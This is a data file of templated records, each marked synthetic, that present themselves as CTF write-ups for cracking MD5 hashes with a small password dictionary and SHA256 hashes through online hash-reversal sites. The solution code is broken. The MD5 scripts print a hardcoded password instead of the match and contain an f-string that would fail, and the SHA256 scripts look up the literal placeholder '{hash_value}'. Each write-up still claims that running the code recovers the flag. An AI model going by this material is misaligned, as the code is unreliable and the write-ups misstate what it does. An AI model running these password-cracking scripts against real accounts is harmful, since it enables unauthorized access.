"crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835377", "synthetic": true}
{"id": "synthetic_hash_062", "team": "synthetic_team_5", "event": "CTF_2024_Event_7", "challenge_name": "MD5 Dictionary Attack #63", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/62", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835396", "synthetic": true}
{"id": "synthetic_hash_063", "team": "synthetic_team_9", "event": "CTF_2024_Event_15", "challenge_name": "SHA256 Rainbow Table #64", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/63", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835410", "synthetic": true}
{"id": "synthetic_hash_064", "team": "synthetic_team_3", "event": "CTF_2024_Event_16", "challenge_name": "SHA256 Rainbow Table #65", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/64", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835423", "synthetic": true}
{"id": "synthetic_hash_065", "team": "synthetic_team_9", "event": "CTF_2024_Event_1", "challenge_name": "SHA256 Rainbow Table #66", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/65", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835439", "synthetic": true}
{"id": "synthetic_hash_066", "team": "synthetic_team_7", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #67", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/66", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835458", "synthetic": true}
{"id": "synthetic_hash_067", "team": "synthetic_team_6", "event": "CTF_2024_Event_14", "challenge_name": "SHA256 Rainbow Table #68", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/67", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835472", "synthetic": true}
{"id": "synthetic_hash_068", "team": "synthetic_team_7", "event": "CTF_2024_Event_11", "challenge_name": "SHA256 Rainbow Table #69", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/68", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835485", "synthetic": true}
{"id": "synthetic_hash_069", "team": "synthetic_team_2", "event": "CTF_2024_Event_14", "challenge_name": "SHA256 Rainbow Table #70", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/69", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835499", "synthetic": true}
{"id": "synthetic_hash_070", "team": "synthetic_team_10", "event": "CTF_2024_Event_20", "challenge_name": "MD5 Dictionary Attack #71", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/70", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835517", "synthetic": true}
{"id": "synthetic_hash_071", "team": "synthetic_team_5", "event": "CTF_2024_Event_8", "challenge_name": "SHA256 Rainbow Table #72", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/71", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835531", "synthetic": true}
{"id": "synthetic_hash_072", "team": "synthetic_team_4", "event": "CTF_2024_Event_7", "challenge_name": "SHA256 Rainbow Table #73", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/72", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835546", "synthetic": true}
{"id": "synthetic_hash_073", "team": "synthetic_team_4", "event": "CTF_2024_Event_3", "challenge_name": "SHA256 Rainbow Table #74", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/73", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835560", "synthetic": true}
{"id": "synthetic_hash_074", "team": "synthetic_team_7", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #75", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/74", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835574", "synthetic": true}
{"id": "synthetic_hash_075", "team": "synthetic_team_10", "event": "CTF_2024_Event_8", "challenge_name": "MD5 Dictionary Attack #76", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/75", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835596", "synthetic": true}
